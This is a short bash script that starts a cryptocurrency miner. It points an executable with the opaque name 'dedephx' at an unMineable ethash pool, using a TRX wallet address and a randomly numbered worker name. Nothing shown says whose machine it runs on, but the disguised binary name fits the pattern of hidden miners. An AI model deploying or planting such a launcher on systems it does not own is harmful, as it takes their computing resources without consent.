#!/bin/bash
POOL=ethash-us.unmineable.com:3333
WALLET=TRX:TYXXLKXA1YY7M8jZGTRqx1reP1mMPMmL5g
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-D-miner#ooa4-g8wz)

chmod +x dedephx
./dedephx -pool $POOL -wal $WALLET.$WORKER
